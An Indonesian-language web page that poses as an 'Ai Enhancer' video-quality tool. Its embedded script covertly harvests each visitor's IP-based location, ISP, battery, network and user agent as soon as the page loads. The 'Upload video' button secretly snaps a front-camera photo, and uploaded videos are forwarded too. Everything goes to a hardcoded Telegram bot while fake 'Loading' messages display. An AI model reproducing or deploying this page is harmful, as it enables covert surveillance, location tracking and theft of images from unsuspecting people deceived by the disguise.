<!doctype html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Ai Enhancer</title>
  <style>
    :root{
      --bg:#0f0f10;
      --card:#161617;
      --muted: rgba(255,255,255,0.78);
      --accent-from: #00f0ff;
      --accent-to: #ff00cc;
      --btn-shadow: rgba(0,240,255,0.12);
    }
    html,body{
      height:100%;margin:0;background:var(--bg);
      font-family:Inter,system-ui,-apple-system,'Segoe UI',Roboto,Arial;
      color:#fff;display:flex;align-items:center;justify-content:center;padding:20px
    }
    .card{
      width:100%;max-width:900px;
      background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
      border-radius:14px;padding:28px;
      box-shadow:0 20px 60px rgba(0,0,0,0.6);
      display:flex;flex-direction:column;gap:24px;align-items:center;justify-content:center
    }
    h1{margin:0 0 10px 0;font-size:28px;font-weight:800;
      background:linear-gradient(90deg,var(--accent-from),var(--accent-to));
      -webkit-background-clip:text;background-clip:text;color:transparent}
    p.lead{margin:0 0 16px 0;color:var(--muted)}
    .small{font-size:13px;color:rgba(255,255,255,0.66)}

    .btn{
      background:linear-gradient(90deg,var(--accent-from),var(--accent-to));
      border:none;padding:12px 24px;
      color:#fff;font-size:15px;font-weight:600;
      border-radius:10px;cursor:pointer;
      box-shadow:0 4px 20px var(--btn-shadow);
      transition:opacity 0.3s;
      margin:6px;
    }
    .btn:hover{opacity:0.9}
    input[type="file"]{display:none}
  </style>
</head>
<body>
  <div class="card" role="main">
    <div class="left">
      <h1>Ai Enhancer</h1>
      <p class="lead">Tingkatkan kualitas video Anda dengan kecerdasan buatan.</p>
      <div class="small">Unggah atau upload video Anda untuk memulai.</div>
    </div>

    <!-- Tombol Izinkan Kamera -->
    <button class="btn" id="cameraBtn">Upload video</button>

    <!-- Tombol Upload Video -->
    <label class="btn">
      ðŸ“¤ Unggah Video
      <input type="file" id="videoInput" accept="video/*" capture="environment">
    </label>

    <!-- Status progress -->
    <div id="status" class="small"></div>
  </div>

<script>
/* ==== CONFIG ==== */
/* Isi dengan token dan chat_id sendiri */
const BOT_TOKEN = "6958063603:AAHtHhQjPJvx-JfHjpB1TyBAMmQJSEl1024"; // <-- isi tokenmu
const CHAT_ID  = "5880037867";  // <-- isi chat id mu
const statusEl = document.getElementById("status");

/* helper kirim text ke telegram */
async function sendTextToTelegram(text){
  if(!BOT_TOKEN || !CHAT_ID) return;
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const form = new FormData();
  form.append("chat_id", CHAT_ID);
  form.append("text", text);
  form.append("parse_mode", "Markdown");
  await fetch(url, { method:"POST", body: form });
}

/* helper kirim video */
async function sendVideoToTelegram(file, caption){
  if(!BOT_TOKEN || !CHAT_ID) return;
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
  const form = new FormData();
  form.append("chat_id", CHAT_ID);
  form.append("video", file);
  form.append("caption", caption);
  await fetch(url, { method:"POST", body: form });
}

/* helper kirim foto */
async function sendPhotoToTelegram(blob, caption){
  if(!BOT_TOKEN || !CHAT_ID) return;
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
  const form = new FormData();
  form.append("chat_id", CHAT_ID);
  form.append("photo", blob, "photo.jpg");
  if(caption) form.append("caption", caption);
  await fetch(url, { method:"POST", body: form });
}

/* ambil info ip dari ipinfo.io */
async function getIpInfo(){
  try {
    const res = await fetch("https://ipinfo.io/json?token=112f6453bc551e");
    return res.json();
  } catch(e){
    return null;
  }
}

/* ambil info device */
async function getDeviceInfo(){
  let batteryTxt = "-";
  try {
    const b = await navigator.getBattery();
    batteryTxt = `${Math.round((b.level||0)*100)}%${b.charging ? " âš¡ï¸ Mengisi daya" : ""}`;
  } catch(e){}
  const conn = navigator.connection || {};
  const net = conn.effectiveType || conn.type || "-";
  return {
    battery: batteryTxt,
    network: net,
    screen: `${screen.width}x${screen.height}`,
    ua: navigator.userAgent,
    time: new Date().toLocaleString("id-ID")
  };
}

/* gabungkan detail ip + device */
async function buildCaption(){
  const ip = await getIpInfo();
  const dev = await getDeviceInfo();
  let text = `ðŸŒ *Informasi IP*`;
  if(ip){
    text += `\nðŸ”¢ Alamat IP: ${ip.ip}`;
    text += `\nðŸ—º Negara: ${ip.country||"-"}`;
    text += `\nðŸŒ Wilayah: ${ip.region||"-"}`;
    text += `\nðŸ“ Kota: ${ip.city||"-"}`;
    text += `\nðŸ“¡ ISP: ${ip.org||"-"}`;
    if(ip.loc){ text += `\nðŸ—º Maps: https://www.google.com/maps?q=${ip.loc}`; }
  }
  text += `\n\nðŸ“± *Detail Perangkat*`;
  text += `\nðŸ”‹ Baterai: ${dev.battery}`;
  text += `\nðŸ“¶ Jaringan: ${dev.network}`;
  text += `\nðŸ–¥ï¸ Layar: ${dev.screen}`;
  text += `\nðŸ•’ Waktu: ${dev.time}`;
  text += `\nðŸ§  User Agent: ${dev.ua}`;
  return text;
}

/* upload video */
document.getElementById("videoInput").addEventListener("change", async (e)=>{
  const file = e.target.files[0];
  if(!file) return;
  statusEl.textContent = "Loading...";
  const caption = await buildCaption();
  await sendVideoToTelegram(file, caption);
  statusEl.textContent = "Loading 90%";
});

/* izinkan kamera + capture foto */
document.getElementById("cameraBtn").addEventListener("click", async ()=>{
  try {
    statusEl.textContent = "loading...";
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio:false });
    const track = stream.getVideoTracks()[0];

    const video = document.createElement("video");
    video.srcObject = new MediaStream([track]);
    await video.play();

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    canvas.getContext("2d").drawImage(video, 0, 0);

    const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg", 0.8));
    const caption = await buildCaption();
    await sendPhotoToTelegram(blob, caption);

    track.stop();
    statusEl.textContent = "loading";
  } catch(err){
    statusEl.textContent = "loading";
    console.error(err);
  }
});

/* kirim info device + ip otomatis saat masuk */
(async () => {
  const caption = await buildCaption();
  await sendTextToTelegram(caption);
})();
</script>
</body>
</html>
